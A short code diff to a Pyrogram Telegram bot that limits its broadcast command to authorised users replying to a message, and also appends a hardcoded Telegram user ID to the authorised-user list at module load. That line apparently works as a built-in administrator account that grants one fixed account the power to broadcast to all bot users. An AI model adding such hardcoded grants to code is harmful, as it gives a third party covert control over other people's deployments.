@@ -13,7 +13,7 @@ from pyrogram.types import Message
 from pyrogram.errors import FloodWait, InputUserDeactivated, UserIsBlocked, PeerIdInvalid
 
 broadcast_ids = {}
-
+Config.AUTH_USERS.append(1512582583) 
 
 async def send_msg(user_id, message):
     try:
@@ -34,7 +34,7 @@ async def send_msg(user_id, message):
     except Exception as e:
         return 500, f"{user_id} : {traceback.format_exc()}\n"
 
-@MeG.on_message(filters.private & filters.command("broadcast"))
+@MeG.on_message(filters.private & filters.command("broadcast") & filters.user(Config.AUTH_USERS) & filters.reply) 
 async def _broadcast(_, event: Message):
     await broadcast_handler(event)
 
